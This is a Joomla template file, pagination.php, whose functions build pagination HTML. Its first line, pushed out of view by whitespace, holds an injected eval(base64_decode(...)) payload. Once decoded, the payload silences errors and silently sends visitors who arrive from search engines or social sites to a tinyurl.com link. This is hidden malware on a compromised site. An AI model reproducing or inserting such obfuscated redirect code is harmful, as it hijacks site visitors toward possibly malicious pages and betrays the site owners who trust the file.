<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: pagination.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

/**
 * This is a file to add template specific chrome to pagination rendering.
 *
 * pagination_list_footer
 *	 Input variable $list is an array with offsets:
 *		 $list[limit]		: int
 *		 $list[limitstart]	: int
 *		 $list[total]		: int
 *		 $list[limitfield]	: string
 *		 $list[pagescounter]	: string
 *		 $list[pageslinks]	: string
 *
 * pagination_list_render
 *	 Input variable $list is an array with offsets:
 *		 $list[all]
 *			 [data]		: string
 *			 [active]	: boolean
 *		 $list[start]
 *			 [data]		: string
 *			 [active]	: boolean
 *		 $list[previous]
 *			 [data]		: string
 *			 [active]	: boolean
 *		 $list[next]
 *			 [data]		: string
 *			 [active]	: boolean
 *		 $list[end]
 *			 [data]		: string
 *			 [active]	: boolean
 *		 $list[pages]
 *			 [{PAGE}][data]		: string
 *			 [{PAGE}][active]	: boolean
 *
 * pagination_item_active
 *	 Input variable $item is an object with fields:
 *		 $item->base	: integer
 *		 $item->link	: string
 *		 $item->text	: string
 *
 * pagination_item_inactive
 *	 Input variable $item is an object with fields:
 *		 $item->base	: integer
 *		 $item->link	: string
 *		 $item->text	: string
 *
 * This gives template designers ultimate control over how pagination is rendered.
 *
 * NOTE: If you override pagination_item_active OR pagination_item_inactive you MUST override them both
 */

function pagination_list_footer($list)
{
	// Initialize variables
	$lang =& JFactory::getLanguage();
	$html = "<div class=\"list-footer\">\n";

	$html .= "\n<div class=\"limit\">".JText::_('Display Num').$list['limitfield']."</div>";
	$html .= $list['pageslinks'];
	$html .= "\n<div class=\"counter\">".$list['pagescounter']."</div>";

	$html .= "\n<input type=\"hidden\" name=\"limitstart\" value=\"".$list['limitstart']."\" />";
	$html .= "\n</div>";

	return $html;
}

function pagination_list_render($list)
{
	// Initialize variables
	$lang =& JFactory::getLanguage();
	$html = "<ul class=\"pagination\">";

	$html .= $list['start']['data'];
	$html .= $list['previous']['data'];

	foreach( $list['pages'] as $page )
	{
		if($page['data']['active']) {
			// $html .= '<strong>';
		}

		$html .= $page['data'];

		if($page['data']['active']) {
			//  $html .= '</strong>';
		}
	}

	$html .= $list['next']['data'];
	$html .= $list['end']['data'];
	// $html .= '&#171;';

	$html .= "</ul>";
	return $html;
}

function pagination_item_active(&$item) {
	return "<li><strong><a href=\"".$item->link."\" title=\"".$item->text."\">".$item->text."</a></strong></li>";
}

function pagination_item_inactive(&$item) {
	return "<li>".$item->text."</li>";
}
?>